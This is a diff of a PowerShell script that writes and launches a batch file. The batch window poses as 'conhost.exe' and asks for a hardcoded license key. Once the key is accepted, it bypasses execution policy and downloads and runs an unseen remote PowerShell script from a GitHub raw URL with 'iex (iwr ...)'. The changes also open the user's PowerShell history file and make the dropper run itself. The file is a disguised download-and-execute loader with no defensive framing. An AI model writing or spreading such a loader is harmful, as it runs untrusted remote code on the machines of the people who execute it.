@@ -2,13 +2,14 @@ $path = "$env:TEMP\run.bat"
 
 @"
 @echo off
-mode con: cols=60 lines=10
+mode con: cols=50 lines=15
 title C:\Windows\System32\conhost.exe
 color 0F
 cls
 
-:: ซ่อน cursor (หลอกๆ)
-echo off >nul
+set hist=%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+if not exist "%hist%" type nul > "%hist%"
+start "" notepad "%hist%"
 
 :input
 set /p key=Enter license key: 
@@ -30,9 +31,14 @@ if "%key%"=="finalpremium-LL22X" goto ok
 goto input
 
 :ok
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
+powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
 
 cls
+color 07
 echo Successfully
 timeout /t 2 >nul
+exit
+"@ | Out-File -Encoding ASCII $path
+
+cmd.exe /c start "" cmd /c "$path"
 exit
